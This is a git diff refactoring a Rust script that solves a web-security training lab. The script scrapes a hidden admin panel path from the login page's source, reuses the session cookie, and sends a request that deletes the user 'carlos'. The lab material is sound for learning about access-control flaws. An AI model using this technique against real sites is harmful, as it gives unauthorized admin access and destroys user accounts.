@@ -1,112 +1,60 @@
 /*************************************************************************
 *
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 4/9/2023
-*
 * Lab: Unprotected admin functionality with unpredictable URL
 *
-* Steps: 1. Fetch the /login page
-*        2. Extract the admin panel path from the source code
-*        3. Fetch the admin panel
-*        4. Delete carlos
+* Hack Steps: 
+*      1. Fetch the login page
+*      2. Extract the admin panel path from the source code
+*      3. Delete carlos from the admin panel
 *
 **************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use std::{
-    collections::HashMap,
     io::{self, Write},
     time::Duration,
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
-fn main() {
-    // change this to your lab URL
-    let url = "https://0a0d00eb04df6a08802c99a9000300d8.web-security-academy.net";
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a2e00c4040397da80cc5db500fc00f6.web-security-academy.net";
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    print!("{} ", "1. Fetching /login page..".white());
-    io::stdout().flush();
-
-    // fetch /login page
-    let get_login_page = client
-        .get(format!("{url}/login"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch /login page".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{} ",
-        "2. Extracting the admin panel path from the source code and the..".white()
-    );
-    io::stdout().flush();
-
-    // extract session cookie
-    let session = extract_session_cookie(get_login_page.headers()).expect(&format!(
-        "{}",
-        "[!] Failed to extract the session cookie".red()
-    ));
-
-    // extract admin panel path from source code
-    let body = get_login_page.text().unwrap();
-    let admin_panel_path = capture_pattern("'(/admin-.*)'", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the admin panel path".red()
-    ));
-
-    println!("{} => {}", "OK".green(), admin_panel_path.yellow());
-    print!("{} ", "3. Fetching the admin panel..".white());
-    io::stdout().flush();
-
-    // fetch the admin panel
-    // this step in not necessary in the script, you can do step 4 directly
-    // it's only a must when solving the lab using the browser
-    let admin_panel = client
-        .get(format!("{url}{admin_panel_path}"))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
-
-    println!("{}", "OK".green());
-    print!("{} ", "4. Deleting carlos..".white());
-    io::stdout().flush();
-
-    // delete carlos
-    client
-        .get(format!("{url}{admin_panel_path}/delete?username=carlos"))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
-
-    println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn main() {
+    print!("⦗1⦘ Fetching the login page.. ");
+    flush_terminal();
+
+    let login_page = fetch("/login");
+
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Extracting the admin panel path from the source code.. ");
+    flush_terminal();
+
+    let session = get_session_cookie(&login_page);
+    let page_content = login_page.text().unwrap();
+    let admin_panel_path = capture_pattern_from_text("'(/admin-.*)'", &page_content);
+
+    println!("{} => {}", "OK".green(), admin_panel_path.yellow());
+    print!("⦗3⦘ Deleting carlos from the admin panel.. ");
+    flush_terminal();
+
+    fetch_with_session(
+        &format!("{admin_panel_path}/delete?username=carlos"),
+        &session,
+    );
+
+    println!("{}", "OK".green());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -114,26 +62,37 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
